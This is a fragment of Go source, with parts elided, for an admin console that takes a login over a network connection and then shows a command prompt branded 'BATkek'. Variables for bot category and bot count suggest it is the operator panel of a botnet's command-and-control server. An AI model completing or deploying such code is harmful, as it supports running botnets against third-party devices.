...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\033[90;1mLogin\033[97;3m: \033[0m"))
    ...
    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[90;1mPassword\033[97;3m: \033[0m"))
    ...
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[90;1mCross-checking credentials...  \033[31m"), spinBuf[i % len(spinBuf)]))
    ...
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\033[31m\r\nAn error has occurred... press (enter) to exit.\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    ...
    this.conn.Write([]byte("\033[37;1m[\033[91m!\033[37m] Do NOT share your credentials!\r\n\033[92;1mReady\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[93;1m" + username + "\033[91m@\033[93mBATkek\033[37m#: \033[0m"))
